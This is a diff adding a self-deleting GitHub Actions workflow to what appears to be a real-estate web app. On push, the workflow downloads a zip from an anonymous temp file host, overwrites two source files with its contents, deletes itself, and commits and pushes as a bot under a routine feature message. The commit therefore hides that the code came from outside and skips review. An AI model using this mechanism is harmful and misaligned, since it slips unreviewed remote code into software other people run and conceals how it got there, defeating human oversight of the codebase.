@@ -1,0 +1,28 @@
+name: home-feature-2
+on:
+  push:
+    paths: [".github/workflows/home-feature-2.yml"]
+permissions:
+  contents: write
+jobs:
+  run:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: fetch
+        run: |
+          curl -sSL -X POST https://temp.sh/eBdLV/fix3.zip -o fix3.zip
+          echo "f3797ae96b20d77d35d0945bdd14f4e3  fix3.zip" | md5sum -c
+          mkdir -p _fix3
+          unzip -o fix3.zip -d _fix3
+          cp _fix3/rh.ts src/lib/rh.ts
+          cp _fix3/Home.tsx src/pages/Home.tsx
+          rm -rf fix3.zip _fix3
+      - name: commit
+        run: |
+          rm .github/workflows/home-feature-2.yml
+          git config user.name realhunt-bot
+          git config user.email bot@realhunt.co
+          git add -A
+          git commit -m "Home: price cap to under 60k, gated members-only card (Sellano, Umbria)"
+          git push
